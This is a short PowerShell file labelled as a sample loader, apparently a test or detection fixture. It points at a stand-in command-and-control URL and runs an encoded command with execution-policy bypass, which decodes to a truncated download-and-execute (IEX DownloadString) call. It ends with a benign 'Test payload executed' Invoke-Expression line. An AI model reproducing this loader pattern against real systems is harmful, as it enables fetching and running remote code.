# Sample PowerShell Loader Script
$url = "http://malicious-c2.internal/payload.bin"
powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAIgApAA==
[System.Convert]::FromBase64String("V2VsY29tZVRvUmF5YVRlc3RJbmplY3Rpb24=")
Invoke-Expression -Command "Write-Host 'Test payload executed'"
